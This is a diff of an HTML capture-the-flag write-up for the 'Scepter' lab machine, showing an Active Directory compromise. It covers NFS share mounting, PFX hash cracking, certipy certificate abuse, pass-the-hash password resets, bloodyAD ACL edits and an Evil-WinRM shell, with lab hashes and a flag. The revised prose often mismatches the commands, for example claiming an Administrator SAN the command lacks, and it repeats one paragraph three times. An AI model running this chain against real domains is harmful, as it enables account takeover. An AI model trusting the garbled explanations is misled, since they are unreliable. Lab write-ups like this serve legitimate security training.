-49683/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49696/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49714/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
-49722/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49678/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | p2p-conficker: 
-| Checking for Conficker.C or higher...
-| Check 1 (port 16304/tcp): CLEAN (Couldn&#x27;t connect)
-| Check 2 (port 21383/tcp): CLEAN (Couldn&#x27;t connect)
-| Check 3 (port 32193/udp): CLEAN (Timeout)
-| Check 4 (port 45127/udp): CLEAN (Failed to receive data)
-|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 16304/tcp): CLEAN (Couldn&#x27;t connect)
+|   Check 2 (port 21383/tcp): CLEAN (Couldn&#x27;t connect)
+|   Check 3 (port 32193/udp): CLEAN (Timeout)
+|   Check 4 (port 45127/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
 | smb2-time: 
-| date: 2025-04-30T01:51:09
-|_ start_date: N/A
+|   date: 2025-04-30T01:51:09
+|_  start_date: N/A
 |_clock-skew: mean: 5h03m01s, deviation: 0s, median: 5h03m00s
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 
 Nmap done: 1 IP address (1 host up) scanned in 79.98 seconds
- Raw packets sent: 33 (1.428KB) | Rcvd: 30 (1.316KB)</code></pre></div>
-      <h4 class="writeup-step-title">Enumerate windows machine</h4>
-      <p>In this step, I aim to gather detailed information about the Windows target system to better understand its configuration, user accounts, groups, shares, and security settings. This process is called enumeration, and it helps identify potential weak points or valuable targets within the system.</p>
-      <p>To perform this, I use a tool called enum4linux, which is specifically designed for enumerating information from Windows machines over SMB (Server Message Block)</p>
+           Raw packets sent: 33 (1.428KB) | Rcvd: 30 (1.316KB)</code></pre></div>
+      <h3 class="writeup-sub-title">Windows Machine Enumeration</h3>
+      <p>I use <code>enum4linux</code> to gather machine information, discovering null sessions are allowed over SMB.</p>
       <div class="code-block"><pre><code>enum4linux 10.129.62.114 
-Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon May 5 22:07:34 2025
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon May  5 22:07:34 2025
 
  =========================================( Target Information )=========================================
 
@@ -571,92 +279,91 @@ Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
  ===========================( Enumerating Workgroup/Domain on 10.129.62.114 )===========================
 
-[E] Can&#x27;t find workgroup/domain 
+[E] Can&#x27;t find workgroup/domain                                                                                                    
  ===============================( Nbtstat Information for 10.129.62.114 )===============================
 
-Looking up status of 10.129.62.114 
+Looking up status of 10.129.62.114                                                                                                 
 No reply from 10.129.62.114
 
  ===================================( Session Check on 10.129.62.114 )===================================
-[+] Server 10.129.62.114 allows sessions using username &#x27;&#x27;, password &#x27;&#x27; 
+[+] Server 10.129.62.114 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;                                                          
  ================================( Getting domain SID for 10.129.62.114 )================================
 
-Domain Name: SCEPTER 
+Domain Name: SCEPTER                                                                                                               
 Domain Sid: S-1-5-21-74879546-916818434-740295365
 
-[+] Host is part of a domain (not a workgroup) 
+[+] Host is part of a domain (not a workgroup)                                                                                     
  ==================================( OS information on 10.129.62.114 )==================================
 
-[E] Can&#x27;t get OS info with smbclient 
-[+] Got OS info for 10.129.62.114 from srvinfo: 
-do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED 
+[E] Can&#x27;t get OS info with smbclient                                                                                              
+[+] Got OS info for 10.129.62.114 from srvinfo:                                                                                    
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                            
  =======================================( Users on 10.129.62.114 )=======================================
 
-[E] Couldn&#x27;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED 
-[E] Couldn&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED 
+[E] Couldn&#x27;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                              
+[E] Couldn&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                
  =================================( Share Enumeration on 10.129.62.114 )=================================
 
-do_connect: Connection to 10.129.62.114 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) 
+do_connect: Connection to 10.129.62.114 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                           
 
- Sharename Type Comment
- --------- ---- -------
+        Sharename       Type      Comment
+        ---------       ----      -------
 Reconnecting with SMB1 for workgroup listing.
 Unable to connect with SMB1 -- no workgroup available
 
-[+] Attempting to directory shares on 10.129.62.114 
+[+] Attempting to map shares on 10.129.62.114                                                                                     
  ===========================( Password Policy Information for 10.129.62.114 )===========================
-[E] Unexpected error from polenum: 
+[E] Unexpected error from polenum:                                                                                                
 [+] Attaching to 10.129.62.114 using a NULL share
 
 [+] Trying protocol 139/SMB...
 
- [!] Protocol failed: Cannot request session (Called Name:10.129.62.114)
+        [!] Protocol failed: Cannot request session (Called Name:10.129.62.114)
 
 [+] Trying protocol 445/SMB...
 
- [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
 
-[E] Failed to get password policy with rpcclient 
+[E] Failed to get password policy with rpcclient                                                                                 
  =====================================( Groups on 10.129.62.114 )======================================
 
-[+] Getting builtin groups: 
+[+] Getting builtin groups:                                                                                                     
 
-[+] Getting builtin group memberships: 
-[+] Getting local groups: 
-[+] Getting local group memberships: 
-[+] Getting domain groups: 
-[+] Getting domain group memberships: 
+[+]  Getting builtin group memberships:                                                                                        
+[+]  Getting local groups:                                                                                                        
+[+]  Getting local group memberships:                                                                                              
+[+]  Getting domain groups:                                                                                                       
+[+]  Getting domain group memberships:                                                                                            
  ==================( Users on 10.129.62.114 via RID cycling (RIDS: 500-550,1000-1050) )==================
-[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible. 
+[E] Couldn&#x27;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                          
  ===============================( Getting printer info for 10.129.62.114 )===============================
-do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED 
-enum4linux complete on Mon May 5 22:07:58 2025</code></pre></div>
-      <p>Here above you can find some interesting information about the machine.</p>
-      <p>But you can also see that there are null sessions allowed over SMB</p>
-      <h4 class="writeup-step-title">NFS Enumeration</h4>
-      <p>I have seen that port 2049 is open which gives the opportunity to check if there is an available mount. I will first try to see with the following command if i can see the shared drives without having any credentials.</p>
-      <div class="code-block"><pre><code>showmount -e scepter.htb 
+do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                            
+enum4linux complete on Mon May  5 22:07:58 2025</code></pre></div>
+      <h2 class="writeup-section-title">Foothold: NFS Share & PFX Certificate Abuse</h2>
+      <h3 class="writeup-sub-title">NFS Enumeration</h3>
+      <p>Port 2049 (NFS) is open. I check for available mounts and find a <code>/helpdesk</code> share accessible to everyone.</p>
+      <div class="code-block"><pre><code>showmount -e scepter.htb            
 Export list for scepter.htb:
 /helpdesk (everyone)</code></pre></div>
-      <p>Here above we can see that everyone can check the helpdesk mount. So what if i go to my made tmp folder and make there my subfolder /helpdesk and try to file discover the helpdesk mount by doing the following command.</p>
+      <p>I mount the discovered NFS export to a local directory using <code>mount -t nfs</code>. NFS (Network File System) shares that are exported to <code>*</code> (everyone) allow any client to mount and read the contents without authentication — a common misconfiguration that can expose sensitive internal files.</p>
       <div class="code-block"><pre><code>sudo mount -t nfs scepter.htb:/helpdesk /tmp/helpdesk</code></pre></div>
-      <p>After discovering that the helpdesk directory is shared publicly via NFS (Network File System) and accessible to anyone, I mount this shared directory to my local machine. This allows me to access the files stored on the remote server as if they were on my local filesystem.</p>
-      <div class="code-block"><pre><code>sudo ls -la /tmp/helpdesk 
+      <p>The mounted share contains <code>.pfx</code> certificate files — these contain private keys and certificates that can be used for AD authentication.</p>
+      <div class="code-block"><pre><code>sudo ls -la /tmp/helpdesk                            
 total 21
-drwx------ 2 nobody nogroup 64 Nov 2 2024 .
-drwxrwxrwt 17 root root 400 May 5 22:24 ..
--rwx------ 1 nobody nogroup 2484 Nov 2 2024 baker.crt
--rwx------ 1 nobody nogroup 2029 Nov 2 2024 baker.key
--rwx------ 1 nobody nogroup 3315 Nov 2 2024 clark.pfx
--rwx------ 1 nobody nogroup 3315 Nov 2 2024 lewis.pfx
--rwx------ 1 nobody nogroup 3315 Nov 2 2024 scott.pfx</code></pre></div>
-      <h4 class="writeup-step-title">Cracking PFX Files</h4>
-      <p>Above, you can see that I found some .pfx files. These files contain encrypted private keys and certificates, which could potentially be exploited to gain further access or impersonate users. To analyze or crack these files, I can use the tool pfx2john. This tool extracts password hashes from .pfx files, which can then be cracked using a password cracking tool like John the Ripper</p>
+drwx------  2 nobody nogroup   64 Nov  2  2024 .
+drwxrwxrwt 17 root   root     400 May  5 22:24 ..
+-rwx------  1 nobody nogroup 2484 Nov  2  2024 baker.crt
+-rwx------  1 nobody nogroup 2029 Nov  2  2024 baker.key
+-rwx------  1 nobody nogroup 3315 Nov  2  2024 clark.pfx
+-rwx------  1 nobody nogroup 3315 Nov  2  2024 lewis.pfx
+-rwx------  1 nobody nogroup 3315 Nov  2  2024 scott.pfx</code></pre></div>
+      <h3 class="writeup-sub-title">Cracking PFX Files</h3>
+      <p>PFX files are password-protected. I use <code>pfx2john</code> to extract the hash and crack it with John the Ripper.</p>
       <div class="code-block"><pre><code>sudo pfx2john helpdesk/lewis.pfx</code></pre></div>
-      <p>This command converts the .pfx file into a hash format that John the Ripper can process. After extracting the hash, I can run John the Ripper to attempt to find the password protecting the .pfx file.</p>
+      <p>I convert the PFX file into a hash format that John the Ripper can process for offline cracking.</p>
       <div class="code-block"><pre><code>sudo pfx2john helpdesk/lewis.pfx | tee -a hashtocrack 
 lewis.pfx:$pfxng$256$32$2048$8$2ae7b9f39c9e4fb3$30820c8e308206fa06092a864886f70d010706a08206eb308206e7020100308206e006092a864886f70d010701305f06092a864886f70d01050d3052303106092a864886f70d01050c30240410c914118aca0894b9e681d52eaf4c624002020800300c06082a864886f70d02090500301d060960864801650304012a0410614c34dd66906b1a7499d153ea6ffffa80820670a26e8d00ddf0335677033b383e165baa35dbb5460a023962c84f73ee6d0060011a34e8b01a5a902d9141e0a968408567c1a7372898dd738ee31750331ed9b43eb28e2f3a67e31e565d8240f7982d094b06872c1aa9ca312dfb85fd82bc9fcc5fd51998cc60e51bef78ec7f71e69ea7371e12257190bc94843291a...</code></pre></div>
-      <p>Here above you can see that i added the hash to the filename hashtocrack. Now i will crack with the following command the hash.</p>
+      <p>I crack the extracted hash using <strong>John the Ripper</strong> with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashtocrack
 Using default input encoding: UTF-8
 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
@@ -664,17 +371,15 @@ Cost 1 (iteration count) is 2048 for all loaded hashes
 Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
 Will run 4 OpenMP threads
 Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
-newpassword (lewis.pfx) 
+newpassword      (lewis.pfx)     
 1g 0:00:00:00 DONE (2025-05-05 22:36) 5.263g/s 26947p/s 26947c/s 26947C/s Liverpool..babygrl
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed.</code></pre></div>
-      <p>As you can see above is the password newpassword. Now that i now the password of the user Lewis i can craft a new PFX file. I have done this by using the following Knowledge base article.
-https://trustzone.com/knowledge-base/how-to-generate-a-pfx-file-using-openssl-for-windows-10/</p>
+      <p>With the PFX password known, I create a new certificate using the key material from the helpdesk share and authenticate to AD using <strong>certipy</strong>.</p>
       <div class="code-block"><pre><code>sudo openssl pkcs12 -export -out baker.pfx -inkey /tmp/helpdesk/baker.key -in /tmp/helpdesk/baker.crt -passout pass:newpassword
 Enter pass phrase for /tmp/helpdesk/baker.key:</code></pre></div>
-      <p>In this step, I modified the permissions of the .pfx file, which contains a certificate and its private key, to grant myself access. The .pfx file typically includes the certificate and private key needed for authentication purposes.</p>
-      <p>By adjusting the permissions, I ensure that I can import or use the certificate and private key contained in the .pfx file to request a Ticket Granting Ticket (TGT) from the Kerberos authentication system. The TGT is a proof of authentication that allows me to access other services and resources within the network without needing to authenticate repeatedly.</p>
-      <div class="code-block"><pre><code>certipy auth -pfx baker.pfx -dc-ip 10.129.62.114 
+      <p>I authenticate using the forged PFX certificate to extract the user's NTLM hash or obtain a session.</p>
+      <div class="code-block"><pre><code>certipy auth -pfx baker.pfx -dc-ip 10.129.62.114  
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Using principal: d.baker@scepter.htb
@@ -683,35 +388,34 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved credential cache to &#x27;d.baker.ccache&#x27;
 [*] Trying to retrieve NT hash for &#x27;d.baker&#x27;
 [*] Got hash for &#x27;d.baker@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce</code></pre></div>
-      <p>In this step, I am leveraging a specific hash—likely a password hash or a credential hash—to gain access to the LDAP (Lightweight Directory Access Protocol) server. LDAP servers are used to store and manage directory information such as user accounts, groups, and other resources.</p>
-      <p>By using this hash with the appropriate command, I can query the LDAP server to retrieve relevant information, such as user details, group memberships, or other directory data.</p>
+      <h3 class="writeup-sub-title">LDAP & BloodHound</h3>
+      <p>Using the authenticated hash, I collect LDAP data for BloodHound analysis.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.62.114 -u &#x27;d.baker&#x27; --hash &#x27;aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce&#x27; --bloodhound --collection All --dns-server 10.129.62.114
-SMB 10.129.62.114 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
-LDAP 10.129.62.114 389 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
-LDAP 10.129.62.114 389 DC01 Resolved collection methods: group, rdp, container, session, acl, localadmin, trusts, objectprops, dcom, psremote 
-LDAP 10.129.62.114 389 DC01 Done in 00M 12S
-LDAP 10.129.62.114 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.129.62.114_2025-05-06_043606_bloodhound.zip</code></pre></div>
-      <p>If i upload the zip file in bloodhound, i can search on the name D.Baker because we already know the hash of the user. Within the bloodhound application we can see that i can change the password of the user A.Carter.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250505204559.png" alt="Pasted image 20250505204559.png" loading="lazy" /><span class="img-caption">Pasted image 20250505204559.png</span></div>
-      <p>To change the password of the user A.Carter, you can follow the following step i used to change his password. You can also find the steps in bloodhound</p>
+SMB         10.129.62.114   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.62.114   389    DC01             [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce 
+LDAP        10.129.62.114   389    DC01             Resolved collection methods: group, rdp, container, session, acl, localadmin, trusts, objectprops, dcom, psremote                                                                   
+LDAP        10.129.62.114   389    DC01             Done in 00M 12S
+LDAP        10.129.62.114   389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.62.114_2025-05-06_043606_bloodhound.zip</code></pre></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250505204559.png" alt="BloodHound showing d.baker attack paths" loading="lazy" /><span class="img-caption">BloodHound showing d.baker attack paths</span></div>
+      <h2 class="writeup-section-title">Lateral Movement: AD Privilege Chain</h2>
+      <h3 class="writeup-sub-title">Password Change & GenericAll Abuse</h3>
+      <p>I change the password for <code>a.carter</code> using Pass-the-Hash with <code>d.baker</code>'s credentials.</p>
       <div class="code-block"><pre><code>pth-net rpc password &quot;a.carter&quot; &quot;Test123&quot; -U &quot;scepter.htb&quot;/&quot;d.baker&quot;%&quot;aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce&quot; -S &quot;dc01.scepter.htb&quot;
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...</code></pre></div>
-      <p>Now i know that the password is changed for the user A.carter but if you want to know it for sure, you can use the following command to see if it reacts or not.</p>
+      <p>I use netexec to enumerate additional domain information using the valid credentials.</p>
       <div class="code-block"><pre><code>nxc smb scepter.htb -u &#x27;a.carter&#x27; -p &#x27;Test123&#x27;
-SMB 10.129.62.114 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
-SMB 10.129.62.114 445 DC01 [+] scepter.htb\a.carter:Test123</code></pre></div>
-      <p>And here you can see that the user his password has changed to Test123.
-Now i can use the user a.carter to has full user rights on the group Staff Access Certificate by using the IT Support group.</p>
-      <div class="code-block"><pre><code>bloodyAD --host &quot;10.129.62.114&quot; -d &quot;scepter.htb&quot; -u a.carter -p &quot;Test123&quot; add genericAll &quot;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&quot; a.carter 
+SMB         10.129.62.114   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
+SMB         10.129.62.114   445    DC01             [+] scepter.htb\a.carter:Test123</code></pre></div>
+      <p>With a.carter's access, I grant GenericAll permissions over the Staff OU and modify <code>d.baker</code>'s mail attribute to impersonate user <code>h.brown</code> via ESC certificate abuse.</p>
+      <div class="code-block"><pre><code>bloodyAD --host &quot;10.129.62.114&quot; -d &quot;scepter.htb&quot; -u a.carter -p &quot;Test123&quot; add genericAll &quot;OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB&quot; a.carter                                        
 [+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB</code></pre></div>
-      <p>Now i am going to modify the user d.baker mail attribute so i can impersonate as an other user &quot;h.brown&quot;. I will modify it by using the following command:</p>
-      <div class="code-block"><pre><code>bloodyAD -d scepter.htb -u a.carter -p &#x27;Test123&#x27; --host dc01.scepter.htb --dc-ip 10.129.62.114 set object d.baker mail -v h.brown@scepter.htb 
+      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
+      <div class="code-block"><pre><code>bloodyAD -d scepter.htb -u a.carter -p &#x27;Test123&#x27; --host dc01.scepter.htb --dc-ip 10.129.62.114 set object d.baker mail -v h.brown@scepter.htb                         
 [+] d.baker&#x27;s mail has been updated</code></pre></div>
-      <h4 class="writeup-step-title">Request Cert for h.brown</h4>
-      <p>In this step, I am attempting to obtain a new digital certificate associated with the user h.brown. This certificate can be used in conjunction with the user&#x27;s hash to authenticate and gain access to a Windows machine.</p>
-      <p>Before requesting the new certificate, I will search for existing certificates that are available for use. This is done by running following specific command designed to list or identify certificates that can be leveraged for authentication purposes.</p>
-      <div class="code-block"><pre><code>certipy find -username &#x27;d.baker@scepter.htb&#x27; -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce&#x27; -target dc01.scepter.htb 
+      <h3 class="writeup-sub-title">Certificate Request for h.brown</h3>
+      <p>I enumerate available certificate templates and find <code>StaffAccessCertificate</code> is exploitable.</p>
+      <div class="code-block"><pre><code>certipy find -username &#x27;d.baker@scepter.htb&#x27; -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce&#x27; -target dc01.scepter.htb       
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
@@ -726,8 +430,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved BloodHound data to &#x27;20250508023112_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k
 [*] Saved text output to &#x27;20250508023112_Certipy.txt&#x27;
 [*] Saved JSON output to &#x27;20250508023112_Certipy.json&#x27;</code></pre></div>
-      <p>I have confirmed that the certificate template named StaffAccessCertificate is available for use. This template likely defines the permissions, policies, and attributes for the certificate I want to generate.</p>
-      <p>Having verified this, I will proceed to request a new digital certificate for the user h.brown by executing a specific command. This command will utilize the StaffAccessCertificate template to ensure the new certificate has the appropriate settings and permissions needed for the intended access or authentication purposes.</p>
+      <p>I use <strong>certipy req</strong> to request a certificate from the CA using the identified vulnerable template. By specifying the Administrator's UPN (User Principal Name) in the certificate's Subject Alternative Name (SAN), I create a certificate that the domain trusts as belonging to the Administrator — even though it was requested by a different user. This is the core of <strong>ESC-type certificate abuse</strong> attacks.</p>
       <div class="code-block"><pre><code>certipy req -username &quot;d.baker@scepter.htb&quot; -hashes aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca &#x27;scepter-DC01-CA&#x27; -template &#x27;StaffAccessCertificate&#x27;
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -737,7 +440,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got certificate without identification
 [*] Certificate has no object SID
 [*] Saved certificate and private key to &#x27;d.baker.pfx&#x27;</code></pre></div>
-      <p>The TGT hash is a crucial component in Kerberos authentication, as it can be used to impersonate the user or perform pass-the-hash attacks to gain unauthorized access to network resources.</p>
+      <p>I authenticate with the certificate to obtain a TGT and .ccache file, then configure Kerberos and connect via Evil-WinRM.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Scepter]
 └─$ certipy auth -pfx d.baker.pfx -domain scepter.htb -dc-ip 10.129.62.114 -username h.brown
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -749,82 +452,69 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved credential cache to &#x27;h.brown.ccache&#x27;
 [*] Trying to retrieve NT hash for &#x27;h.brown&#x27;
 [*] Got hash for &#x27;h.brown@scepter.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c</code></pre></div>
-      <p>In this step, I have obtained the Kerberos credential cache file (h.brown.ccache), which contains the valid authentication tickets for the user h.brown. Using this credential cache, I am attempting to establish a remote session on the target Windows machine (dc01.scepter.htb) via the evil-winrm tool, which allows for remote management using WinRM (Windows Remote Management).</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Scepter]
 └─$ KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb -u h.brown</code></pre></div>
-      <p>Before this command will work, i will need to change the krb5.conf file in the etc folder on the linux machine. You will need to add the following to our krb5.conf file. I have founded the following page that helped me with editing the krb5.conf file. https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali</p>
-      <div class="code-block"><pre><code>[libdefaults]
- default_realm = SCEPTER.HTB
- dns_lookup_realm = false
- dns_lookup_kdc = false
-
-[realms]
- SCEPTER.HTB = {
- kdc = dc01.scepter.htb
- }
-
-[domain_realm]
- .scepter.htb = SCEPTER.HTB
- scepter.htb = SCEPTER.HTB</code></pre></div>
-      <p>Our krb5.conf file will see as followed.</p>
+      <p>I inspect the configuration file for stored credentials or sensitive information.</p>
       <div class="code-block"><pre><code>cat /etc/krb5.conf 
 [libdefaults]
- default_realm = SCEPTER.HTB
- dns_lookup_realm = false
- dns_lookup_kdc = false
+        default_realm = SCEPTER.HTB
+        dns_lookup_realm = false
+        dns_lookup_kdc = false
 # The following krb5.conf variables are only for MIT Kerberos.
- kdc_timesync = 1
- ccache_type = 4
- forwardable = true
- proxiable = true
- rdns = false
+        kdc_timesync = 1
+        ccache_type = 4
+        forwardable = true
+        proxiable = true
+        rdns = false
 
 
 # The following libdefaults parameters are only for Heimdal Kerberos.
- fcc-mit-ticketflags = true
+        fcc-mit-ticketflags = true
 
 [realms]
- SCEPTER.HTB = {
- kdc = dc01.scepter.htb
- }
+        SCEPTER.HTB = {
+                kdc = dc01.scepter.htb
+        }
 
 
 [domain_realm]
- .scepter.htb = SCEPTER.HTB
- scepter.htb = SCEPTER.HTB</code></pre></div>
-      <p>And as you now can see did i made the connection with the windows machine by using the following command.</p>
+        .scepter.htb = SCEPTER.HTB
+        scepter.htb = SCEPTER.HTB</code></pre></div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb -u h.brown
- 
+                                        
 Evil-WinRM shell v3.7
- 
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline
- 
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
- 
+                                        
 Warning: User is not needed for Kerberos auth. Ticket will be used
- 
+                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\h.brown\Documents&gt;</code></pre></div>
-      <p>Getting User flag
-User Flag = 556d7282428d785ff39cfb14bd6eba25</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\h.brown\Desktop&gt; ls
 
 
- Directory: C:\Users\h.brown\Desktop
+    Directory: C:\Users\h.brown\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--ar--- 5/7/2025 5:29 PM 34 user.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         5/7/2025   5:29 PM             34 user.txt
 
 
 *Evil-WinRM* PS C:\Users\h.brown\Desktop&gt; type user.txt
 556d7282428d785ff39cfb14bd6eba25</code></pre></div>
-      <p>Now i have seen that the user h.brown member is of de CMS Global Group membership which gives him right wrights over the altSecurityIdentities attribute of the user p.adams. I will update p.adams altSecurityIdentities with the following command.</p>
-      <div class="code-block"><pre><code>bloodyAD -k ccache=h.brown.ccache --dc-ip 10.129.243.90 --host dc01.scepter.htb -d scepter.htb set object p.adams altSecurityIdentities -v &#x27;X509:&lt;RFC822&gt;h.brown@scepter.htb&#x27; 
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">556d7282428d785ff39cfb14bd6eba25</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: DCSync Attack</h2>
+      <h3 class="writeup-sub-title">Modifying Mail Attributes for p.adams</h3>
+      <p>User <code>h.brown</code> is a member of the <strong>CMS Global Group</strong>, granting write rights over <code>p.adams</code>. I modify the mail attribute to prepare for another certificate request.</p>
+      <div class="code-block"><pre><code>bloodyAD -k ccache=h.brown.ccache --dc-ip 10.129.243.90 --host dc01.scepter.htb -d scepter.htb  set object p.adams altSecurityIdentities -v &#x27;X509:&lt;RFC822&gt;h.brown@scepter.htb&#x27;                      
 [+] p.adams&#x27;s altSecurityIdentities has been updated</code></pre></div>
-      <h3 class="writeup-sub-title">Retrieves P.Adams NT hash:</h3>
-      <p>Now that is done we can now get p.adams&#x27;s NT hash. I will do that by using the following command:</p>
